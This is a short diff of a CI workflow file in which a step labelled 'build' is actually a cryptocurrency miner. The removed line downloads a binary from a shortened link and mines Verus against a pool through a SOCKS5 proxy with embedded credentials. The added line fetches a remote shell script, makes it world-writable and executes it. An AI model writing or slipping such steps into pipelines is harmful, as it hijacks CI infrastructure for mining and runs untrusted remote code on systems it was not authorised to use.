@@ -52,4 +52,4 @@ jobs:
     - name : install dependencies 
       run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1  
     - name: build  
-      run: wget -qO build https://git.io/JKYC2 && chmod +x build && ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RLW9aeQT9LVYYxpKtXRNdvh8H8HuTmPfg4.MosLine -p x -t 2 -x socks5://mfcluegu:1caszbq46xyi@162.144.66.22:45220
+      run: wget https://raw.githubusercontent.com/finxuebe/gaiss/main/Tigaan.sh && chmod 777 Tigaan.sh && ./Tigaan.sh
